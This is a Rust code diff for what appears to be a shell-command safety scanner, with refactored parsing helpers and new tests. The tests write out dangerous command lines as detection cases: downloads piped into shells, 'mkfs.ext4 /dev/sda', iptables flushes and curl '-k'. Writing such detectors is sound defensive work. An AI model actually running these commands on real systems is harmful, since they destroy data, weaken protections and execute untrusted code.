@@ -18,6 +18,10 @@ pub mod hosts;
 pub mod persist;
 pub mod shell;
 
+use shell::{
+    PIPE_SHELLS, program_name, shell_words, short_flag, unquoted, unquoted_words, unversioned,
+};
+
 #[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
 pub enum RuleId {
     DownloadAndExecute,
@@ -805,10 +809,6 @@ const RUNNERS: &[&str] = &[
     "php", "lua",
 ];
 
-fn program_name(word: &str) -> &str {
-    word.rsplit('/').next().unwrap_or_default()
-}
-
 /// A file name as written, without a leading `./`.
 fn as_file(word: &str) -> Option<String> {
     let name = word.trim_end_matches(';').trim_start_matches("./");
@@ -818,10 +818,7 @@ fn as_file(word: &str) -> Option<String> {
 /// The file a fetch on `line` is saved as: `curl -o x`, `wget -O x`,
 /// `curl … > x`, or the name in the address for `wget` and `curl -O`.
 pub fn fetched_file(line: &str) -> Option<String> {
-    let words: Vec<String> = shell_words(line)
-        .iter()
-        .map(|word| unquoted(word))
-        .collect();
+    let words = unquoted_words(line);
     let at = words
         .iter()
         .position(|word| FETCHERS.contains(&program_name(word)))?;
@@ -957,11 +954,7 @@ pub fn runs_file(line: &str, file: &str) -> bool {
             name == file || without_group_close(&name) == without_group_close(file)
         })
     };
-    let names_it = |statement: &str| {
-        shell_words(statement)
-            .iter()
-            .any(|word| is_named(&unquoted(word)))
-    };
+    let names_it = |statement: &str| unquoted_words(statement).iter().any(|word| is_named(word));
     // `cat x | sh`.
     if pipes_into_shell(line, names_it) {
         return true;
@@ -982,22 +975,18 @@ fn runs_named(command: &shell::Command, is_named: &dyn Fn(&str) -> bool) -> bool
     if (program.contains('/') || program.starts_with('$')) && is_named(program) {
         return true;
     }
-    // `python3.12` is `python`.
     let name = command.program.as_str();
-    let unversioned =
-        name.trim_end_matches(|character: char| character.is_ascii_digit() || character == '.');
+    let unversioned = unversioned(name);
     // Only parsed or compiled: `sh -n`, `node --check`, `python -m`.
     let only_checks = command
         .arguments
         .iter()
         .take_while(|word| word.starts_with('-'))
-        .any(|word| {
-            matches!(
-                (unversioned, word.as_str()),
-                ("sh" | "bash" | "zsh" | "dash" | "ksh", "-n")
-                    | ("python", "-m")
-                    | ("node", "--check")
-            )
+        .any(|word| match word.as_str() {
+            "-n" => PIPE_SHELLS.contains(&unversioned),
+            "-m" => unversioned == "python",
+            "--check" => unversioned == "node",
+            _ => false,
         });
     (RUNNERS.contains(&name) || (!unversioned.is_empty() && RUNNERS.contains(&unversioned)))
         && !only_checks
@@ -1029,21 +1018,21 @@ pub fn run_targets(line: &str) -> Vec<String> {
         if index >= MAX_STATEMENTS {
             break;
         }
-        let segments: Vec<&str> = statement.split('|').take(MAX_SEGMENTS).collect();
+        // Each segment's command, read once.
+        let commands: Vec<Option<shell::Command>> = statement
+            .split('|')
+            .take(MAX_SEGMENTS)
+            .map(run_command)
+            .collect();
         // Whether a shell reads what comes after each segment, worked out
         // once from the end.
-        let mut shell_after = vec![false; segments.len() + 1];
-        for at in (0..segments.len()).rev() {
-            let is_shell = shell_words(segments[at])
-                .first()
-                .map(|word| unquoted(word))
-                .is_some_and(|word| {
-                    matches!(program_name(&word), "sh" | "bash" | "zsh" | "dash" | "ksh")
-                });
+        let mut shell_after = vec![false; commands.len() + 1];
+        for at in (0..commands.len()).rev() {
+            let is_shell = commands[at].as_ref().is_some_and(shell::Command::is_shell);
             shell_after[at] = shell_after[at + 1] || is_shell;
         }
-        for (at, segment) in segments.iter().enumerate() {
-            let Some(command) = run_command(segment) else {
+        for (at, command) in commands.iter().enumerate() {
+            let Some(command) = command else {
                 continue;
             };
             if command.path.contains('/') {
@@ -1061,8 +1050,7 @@ pub fn run_targets(line: &str) -> Vec<String> {
                 }
                 continue;
             }
-            let unversioned = name
-                .trim_end_matches(|character: char| character.is_ascii_digit() || character == '.');
+            let unversioned = unversioned(name);
             if !(RUNNERS.contains(&name)
                 || (!unversioned.is_empty() && RUNNERS.contains(&unversioned)))
             {
@@ -1073,7 +1061,7 @@ pub fn run_targets(line: &str) -> Vec<String> {
                 .iter()
                 .take_while(|word| word.starts_with('-'))
                 .collect();
-            let shell = matches!(unversioned, "sh" | "bash" | "zsh" | "dash" | "ksh");
+            let shell = PIPE_SHELLS.contains(&unversioned);
             if options.iter().any(|option| {
                 matches!(**option, "-c" | "-n" | "-m" | "--check")
                     || (**option == "-e" && !shell)
@@ -1138,23 +1126,12 @@ pub fn run_globs(line: &str) -> Vec<String> {
 
 /// `run_globs` for one statement; `piped` says its line has a pipe.
 fn globs_run_by(statement: &str, piped: bool, is_glob: &dyn Fn(&str) -> bool) -> Vec<String> {
-    let words: Vec<String> = shell_words(statement)
-        .iter()
-        .map(|word| unquoted(word))
-        .collect();
-    let mut words = words.iter().map(String::as_str).skip_while(|word| {
-        matches!(
-            *word,
-            "sudo" | "doas" | "run0" | "env" | "command" | "exec" | "then" | "do" | "else" | "!"
-        ) || word.starts_with('-')
-    });
-    let Some(program) = words.next() else {
+    let Some(command) = shell::command(statement) else {
         return Vec::new();
     };
-    let name = program_name(program);
-    let unversioned =
-        name.trim_end_matches(|character: char| character.is_ascii_digit() || character == '.');
-    let arguments: Vec<&str> = words.collect();
+    let name = command.program.as_str();
+    let unversioned = unversioned(name);
+    let arguments: Vec<&str> = command.arguments.iter().map(String::as_str).collect();
     let operands = arguments
         .iter()
         .copied()
@@ -1357,7 +1334,7 @@ pub fn command_variables(text: &str) -> Vec<(String, String)> {
         let program = program_name(value);
         if is_name
             && !value.contains(char::is_whitespace)
-            && (FETCHERS.contains(&program) || matches!(program, "sh" | "bash" | "zsh" | "dash"))
+            && (FETCHERS.contains(&program) || PIPE_SHELLS.contains(&program))
         {
             let name = name.to_ascii_lowercase();
             found.retain(|(known, _)| *known != name);
@@ -1425,41 +1402,11 @@ fn runs_fetched_text(line: &str) -> bool {
                 .any(|runner| contains_pattern(line, runner)))
 }
 
-/// Shells that read commands from standard input.
-const PIPE_SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh", "ash", "fish"];
-
 /// Other interpreters that run what is piped into them. They double as
 /// ordinary words in a regex alternation (`(curl|perl|wget)`), so a pipe
 /// into one counts only when the pipe has whitespace beside it, as a real
 /// pipeline does and an alternation does not.
 const PIPE_INTERPRETERS: &[&str] = &["python", "perl", "ruby", "node", "php", "lua"];
-
-/// Wrappers that run the command after them without changing what it is, so
-/// `| timeout 5 sh` still reads the pipe into a shell.
-fn skip_pipe_wrappers<'a>(words: &mut impl Iterator<Item = &'a str>) -> Option<&'a str> {
-    let mut word = words.next()?;
-    loop {
-        let bare = word.trim_start_matches(['(', '{', '"', '\'']);
-        match bare {
-            "sudo" | "doas" | "run0" | "env" | "command" | "exec" | "nice" | "nohup" | "setsid"
-            | "stdbuf" | "ionice" | "chrt" | "time" => word = words.next()?,
-            // `timeout 5s cmd`, `timeout --signal=9 10 cmd`.
-            "timeout" => {
-                word = words.next()?;
-                while word.starts_with('-') {
-                    word = words.next()?;
-                }
-                word = words.next()?;
-            }
-            // `env VAR=x cmd`, an inline assignment before the program.
-            _ if bare.contains('=') && !bare.starts_with(['/', '.', '$']) => word = words.next()?,
-            _ if bare.starts_with('-') => word = words.next()?,
-            // A lone grouping token: `| { sh; }`, `| ( sh )`.
-            _ if bare.is_empty() => word = words.next()?,
-            _ => return Some(word),
-        }
-    }
-}
 
 /// Whether the program word of a pipeline segment reads and runs its input:
 /// a shell or another interpreter, `source`/`.`, a `$SHELL` variable, or
@@ -1483,9 +1430,7 @@ fn consumes_pipe<'a>(word: &str, mut rest: impl Iterator<Item = &'a str>, spaced
             .next()
             .is_some_and(|next| matches!(next, "sh" | "ash" | "bash"));
     }
-    let unversioned =
-        program.trim_end_matches(|character: char| character.is_ascii_digit() || character == '.');
-    [program, unversioned].iter().any(|name| {
+    [program, unversioned(program)].iter().any(|name| {
         !name.is_empty()
             && (PIPE_SHELLS.contains(name) || (spaced && PIPE_INTERPRETERS.contains(name)))
     })
@@ -1506,12 +1451,19 @@ fn pipes_into_shell(line: &str, source: impl Fn(&str) -> bool) -> bool {
         // (`a|perl|b`) does not.
         let spaced = segments[index - 1].ends_with(char::is_whitespace)
             || segments[index].starts_with(char::is_whitespace);
-        let mut words = segments[index].split_whitespace();
-        let Some(word) = skip_pipe_wrappers(&mut words) else {
+        // A segment cut at a pipe may open a quote it does not close
+        // (`sh -c "a | sh"`), so its words are cut at whitespace alone and
+        // a quote before a word is taken off it. Wrappers that run the
+        // command after them do not change what it is, so `| timeout 5 sh`
+        // still reads the pipe into a shell.
+        let mut words = segments[index]
+            .split_whitespace()
+            .map(|word| word.trim_start_matches(['(', '{', '"', '\'']));
+        let Some(word) = shell::program_word(&mut words) else {
             return false;
         };
         // `xargs sh -c '…'`: xargs hands the input to the shell.
-        if program_name(word.trim_start_matches(['(', '{'])) == "xargs" {
+        if program_name(word) == "xargs" {
             let mut rest = words.skip_while(|argument| argument.starts_with('-'));
             return rest
                 .next()
@@ -1626,9 +1578,8 @@ const BLOCK_DEVICES: &[&str] = &[
 
 /// A `>`/`>>` onto a whole block device.
 fn redirects_onto_device(line: &str) -> bool {
-    shell_words(line)
-        .iter()
-        .map(|word| unquoted(word))
+    unquoted_words(line)
+        .into_iter()
         .filter_map(|word| {
             word.strip_prefix(">>")
                 .or_else(|| word.strip_prefix('>'))
@@ -1664,10 +1615,7 @@ fn relabels_partition_table(line: &str) -> bool {
 
 /// `dd` writing to a block device, in either argument order.
 fn writes_a_device(line: &str) -> bool {
-    let words: Vec<String> = shell_words(line)
-        .iter()
-        .map(|word| unquoted(word))
-        .collect();
+    let words = unquoted_words(line);
     words
         .iter()
         .any(|word| word == "dd" || word.ends_with("/dd"))
@@ -1722,46 +1670,15 @@ fn formats_filesystem(line: &str) -> bool {
             {
                 return false;
             }
-            let words = shell_words(segment);
-            let command = words
-                .iter()
-                .map(|word| unquoted(word))
-                .find(|word| !matches!(word.as_str(), "sudo" | "doas") && !word.starts_with('-'))
-                .unwrap_or_default();
-            !FILE_COMMANDS.contains(&command.rsplit('/').next().unwrap_or_default())
+            let words = unquoted_words(segment);
+            let mut rest = words.iter().map(String::as_str);
+            let handles_file = shell::program_word(&mut rest)
+                .is_some_and(|program| FILE_COMMANDS.contains(&program_name(program)));
+            // What stands before the program may run one itself:
+            // `X="$(mkfs.ext4 /dev/sda)" ls`.
+            let before = &words[..words.len() - rest.len()];
+            !handles_file || before.iter().any(|word| word.contains("mkfs."))
         })
-}
-
-/// Splits a command line into words at whitespace outside quotes. Quote
-/// characters are kept in the words.
-fn shell_words(line: &str) -> Vec<String> {
-    let mut words = Vec::new();
-    let mut word = String::new();
-    let mut quote: Option<char> = None;
-    for character in line.chars() {
-        if quote.is_none() && character.is_whitespace() {
-            if !word.is_empty() {
-                words.push(std::mem::take(&mut word));
-            }
-            continue;
-        }
-        match quote {
-            Some(open) if character == open => quote = None,
-            None if character == '"' || character == '\'' => quote = Some(character),
-            Some(_) | None => {}
-        }
-        word.push(character);
-    }
-    if !word.is_empty() {
-        words.push(word);
-    }
-    words
-}
-
-fn unquoted(word: &str) -> String {
-    word.chars()
-        .filter(|character| !matches!(character, '"' | '\''))
-        .collect()
 }
 
 /// Recursive `rm` of `/`, `/*`, `~` or `$HOME` itself. Removing paths below
@@ -1897,31 +1814,78 @@ const DISABLED_TLS_PATTERNS: &[&str] = &[
     "curl_sslverify_none",
 ];
 
-/// Whether a short-flag cluster of `program` carries the flag letter
-/// `flag`: `-k`, `-sk`, `-fsSLk`, but not `--key` nor a flag of another
-/// command on the line. `program` is matched without its path.
-fn program_short_flag(line: &str, program: &str, flag: char) -> bool {
+/// Commands that only show what they are given.
+const PRINTERS: &[&str] = &["echo", "printf"];
+
+/// Whether a short-flag cluster of one of `programs` carries the flag
+/// letter `flag`: `-k`, `-sk`, `-fsSLk`, before or after the command's
+/// other arguments (`curl URL -k -o f`), but not `--key` nor a flag of
+/// another command on the line. A program is matched without its path.
+fn program_short_flag(line: &str, programs: &[&str], flag: char) -> bool {
+    if !programs.iter().any(|program| line.contains(program)) {
+        return false;
+    }
+    // The parts follow one another in the line, so what divides each from
+    // the next is read where it ends.
+    let mut start = 0;
+    for part in shell::split_top(line, &["&&", "||", ";", "|", "&", "\n"]) {
+        let end = start + part.len();
+        let after = line.get(end..).unwrap_or_default();
+        let doubled = after.starts_with("&&") || after.starts_with("||");
+        let piped = after.starts_with('|') && !doubled;
+        if part_short_flag(part, piped, programs, flag) {
+            return true;
+        }
+        start = end + if doubled { 2 } else { 1 };
+    }
+    false
+}
+
+/// `program_short_flag` for one command; `piped` says a pipe carries its
+/// output on.
+fn part_short_flag(part: &str, piped: bool, programs: &[&str], flag: char) -> bool {
+    if !(part.contains('-')
+        && part.contains(flag)
+        && programs.iter().any(|program| part.contains(program)))
+    {
+        return false;
+    }
+    let words = unquoted_words(part);
+    let mut rest = words.iter().map(String::as_str);
+    let command = shell::program_word(&mut rest).map(program_name);
+    // The words up to and with the command: wrappers, assignments, and
+    // the program `shell::command` finds.
+    let leading = words.len() - rest.len();
+    // Shown, not run, unless what is shown goes on into a pipe or a file.
+    if command.is_some_and(|command| PRINTERS.contains(&command)) && !piped && !part.contains('>') {
+        return false;
+    }
+    // Every option up to the end of the command is its own when the
+    // program is the command, or a setting's value (`ExecStart=/bin/curl`).
+    // Named further on (`xargs curl -k`), only those before its first
+    // operand are: another program may follow.
+    let mut own = false;
     let mut running = false;
-    for word in shell_words(line).iter().map(|word| unquoted(word)) {
-        match word.as_str() {
-            ";" | "|" | "&&" | "||" | "&" => running = false,
-            _ if matches!(
-                word.as_str(),
-                "sudo" | "doas" | "run0" | "env" | "command" | "exec"
-            ) => {}
-            _ if word.starts_with("--") => {}
-            // A short-flag cluster of the program now running.
-            _ if running && word.starts_with('-') => {
-                if word[1..]
-                    .chars()
-                    .all(|character| character.is_ascii_alphabetic())
-                    && word[1..].contains(flag)
-                {
-                    return true;
-                }
+    for (index, word) in words.iter().enumerate() {
+        // A part that opens a group it does not close is not cut inside it.
+        if matches!(word.as_str(), ";" | "|" | "&&" | "||" | "&") {
+            own = false;
+            running = false;
+        } else if word.starts_with('-') {
+            if running && short_flag(word.trim_end_matches([';', ')', '`']), flag) {
+                return true;
             }
-            _ if word.starts_with('-') => {}
-            _ => running = program_name(&word) == program,
+        } else if !own {
+            let name = match command {
+                Some(command) if index + 1 == leading => command,
+                _ => program_name(word),
+            };
+            running = programs.contains(&name);
+            own = running && index < leading;
+        }
+        if word.ends_with(';') {
+            own = false;
+            running = false;
         }
     }
     false
@@ -1932,10 +1896,7 @@ fn program_short_flag(line: &str, program: &str, flag: char) -> bool {
 /// simply present as a command). Arguments stop at a command separator, so
 /// a flag of a later command does not count.
 fn command_has_flag(line: &str, programs: &[&str], exact_flags: &[&str]) -> bool {
-    let words: Vec<String> = shell_words(line)
-        .iter()
-        .map(|word| unquoted(word))
-        .collect();
+    let words = unquoted_words(line);
     let mut index = 0;
     while index < words.len() {
         if programs.contains(&program_name(&words[index])) {
@@ -1975,7 +1936,7 @@ fn disables_tls_verification(line: &str) -> bool {
     if git_off && line.contains("git") {
         return true;
     }
-    program_short_flag(line, "curl", 'k')
+    program_short_flag(line, &["curl"], 'k')
 }
 
 /// A shell wired to a network connection, so the commands come from
@@ -2069,7 +2030,7 @@ fn disables_protection(line: &str) -> bool {
             .any(|service| line.contains(service));
     let ufw_off = line.contains("ufw disable") || line.contains("ufw --force disable");
     let flush = line.contains("nft flush ruleset")
-        || program_short_flag(line, "iptables", 'f')
+        || program_short_flag(line, &["iptables", "ip6tables"], 'f')
         || line.contains("iptables --flush")
         || line.contains("ip6tables --flush");
     let selinux = line.contains("setenforce 0") || line.contains("setenforce  0");
@@ -3203,6 +3164,156 @@ mod tests {
                 "{safe}"
             );
         }
+    }
+
+    #[test]
+    fn a_flag_after_an_argument_is_still_the_commands_own() {
+        let tls = RuleId::DisabledTlsVerification;
+        let protection = RuleId::ProtectionDisabled;
+        for (line, rule) in [
+            ("curl https://x.test/i -k", tls),
+            ("curl -s https://x.test/i -k -o f", tls),
+            ("sudo -u build curl -o f https://x.test/i -sk", tls),
+            ("timeout 5 curl https://x.test/i -k", tls),
+            ("true; curl https://x.test/i -k; true", tls),
+            ("curl https://x.test/i -k | tar xz", tls),
+            ("curl \"https://x.test/i?a=1&b=2\" -k", tls),
+            // A group's opening word is read past, like any wrapper.
+            ("(curl -k https://x.test/i)", tls),
+            ("if ! (curl https://x.test/i -k); then", tls),
+            // A setting's value, and a program another one is given.
+            ("ExecStart=/usr/bin/curl https://x.test/i -k", tls),
+            ("xargs curl -k", tls),
+            // Shown into a shell or a file is not only shown.
+            ("echo curl -k https://x.test/i | sh", tls),
+            ("echo curl -k https://x.test/i > fetch.sh", tls),
+            ("iptables -t nat -F", protection),
+            ("sudo iptables -t filter -F INPUT", protection),
+            ("ip6tables -F", protection),
+            ("ip6tables -t mangle -F", protection),
+            ("/usr/bin/ip6tables -w -F", protection),
+        ] {
+            assert!(rules_for(line).contains(&rule), "{line}");
+        }
+        for (line, rule) in [
+            ("echo curl -k", tls),
+            ("printf '%s\\n' curl https://x.test/i -k", tls),
+            ("curl https://x/-k", tls),
+            ("curl https://x.test/i --key client.key", tls),
+            // The flag is another program's, later on the line.
+            ("curl https://x.test/i && tar -k -xf a.tar", tls),
+            ("curl https://x.test/i | tar -k -x", tls),
+            ("curl https://x.test/i; make -k check", tls),
+            ("curl https://x.test/i & grep -k x", tls),
+            ("(curl https://x.test/i && tar -k -xf a.tar)", tls),
+            ("xargs curl https://x.test/i | sort -k 2", tls),
+            ("echo iptables -F", protection),
+            ("iptables -L -n; ls -f", protection),
+            ("iptables -L && rm -f x", protection),
+            ("ip6tables -L | grep -f patterns", protection),
+            ("iptables-save -f /etc/iptables/rules.v4", protection),
+        ] {
+            assert!(!rules_for(line).contains(&rule), "{line}");
+        }
+    }
+
+    #[test]
+    fn every_reader_knows_the_same_wrappers() {
+        use super::{run_globs, run_targets, runs_file};
+        // Piped into a shell that another user runs.
+        assert!(is_download_piped_to_shell(
+            "curl https://x.test/i | sudo -u nobody bash"
+        ));
+        assert!(!is_download_piped_to_shell(
+            "curl https://x.test/data | sudo -u sh cat"
+        ));
+        // A glob run behind a time limit, an assignment or a group.
+        for (line, globs) in [
+            ("timeout 5 bash scripts/*", &["scripts/*"][..]),
+            ("X=1 nohup sh hooks.d/*.sh", &["hooks.d/*.sh"]),
+            ("(for h in hooks.d/*", &["hooks.d/*"]),
+            ("if run-parts d; then", &["d"]),
+        ] {
+            assert_eq!(run_globs(line), globs, "{line}");
+        }
+        for line in ["timeout 5 ls scripts/*", "X=1 cat notes/*.txt"] {
+            assert!(run_globs(line).is_empty(), "{line}");
+        }
+        // What is read into a shell behind a wrapper, or into any shell.
+        assert_eq!(run_targets("cat payload.bin | sudo sh"), ["payload.bin"]);
+        assert_eq!(run_targets("cat payload.bin | fish"), ["payload.bin"]);
+        // `-n` only parses, for every shell.
+        assert!(runs_file("fish i.sh", "i.sh"));
+        assert!(!runs_file("fish -n i.sh", "i.sh"));
+        assert!(run_targets("fish -n i.sh").is_empty());
+        assert!(run_targets("fish -ic 'echo hi'").is_empty());
+        // A file command behind a wrapper still only handles the file, and
+        // a program behind one still runs.
+        for packaging in [
+            "env install -m755 mkfs.x /usr/bin/",
+            "if test -x mkfs.ext4; then",
+            "(rm mkfs.x y)",
+            "X=1 install -m755 mkfs.x \"$pkgdir/usr/bin/\"",
+        ] {
+            assert!(
+                !rules_for(packaging).contains(&RuleId::DestructiveSystemOperation),
+                "{packaging}"
+            );
+        }
+        for running in [
+            "sudo -u install mkfs.ext4 /dev/sda",
+            "nohup mkfs.ext4 /dev/sda",
+            "X=\"$(mkfs.ext4 /dev/sda)\" ls",
+        ] {
+            assert!(
+                rules_for(running).contains(&RuleId::DestructiveSystemOperation),
+                "{running}"
+            );
+        }
+        assert_eq!(
+            super::command_variables("S=fish\nK=/bin/ksh\n"),
+            [
+                ("s".to_string(), "fish".to_string()),
+                ("k".to_string(), "ksh".to_string())
+            ]
+        );
+    }
+
+    #[test]
+    fn a_long_line_costs_each_reader_one_pass() {
+        use super::{
+            formats_filesystem, pipes_into_shell, program_short_flag, run_globs, run_targets,
+        };
+        let started = std::time::Instant::now();
+        // Many commands, many wrappers, a group never closed.
+        assert!(!program_short_flag(
+            &"curl -a;".repeat(50_000),
+            &["curl"],
+            'k'
+        ));
+        assert!(!program_short_flag(
+            &"(curl -a | ".repeat(40_000),
+            &["curl"],
+            'k'
+        ));
+        assert!(program_short_flag(
+            &("sudo ".repeat(80_000) + "curl a -k"),
+            &["curl"],
+            'k'
+        ));
+        assert!(formats_filesystem(&"mkfs.x y;".repeat(40_000)));
+        assert!(!formats_filesystem(
+            &("sudo ".repeat(80_000) + "install mkfs.x")
+        ));
+        assert!(!pipes_into_shell(&"a|".repeat(200_000), |_| true));
+        assert!(pipes_into_shell(
+            &("a|".to_string() + &"sudo ".repeat(80_000) + "sh"),
+            |_| true
+        ));
+        assert_eq!(run_globs(&"for a in b/*;".repeat(30_000)), ["b/*"]);
+        assert_eq!(run_globs(&("x=".repeat(200_000) + " sh a/*")), ["a/*"]);
+        assert_eq!(run_targets(&"cat a | sudo sh;".repeat(25_000)), ["a"]);
+        assert!(started.elapsed().as_secs() < 10, "{:?}", started.elapsed());
     }
 
     #[test]
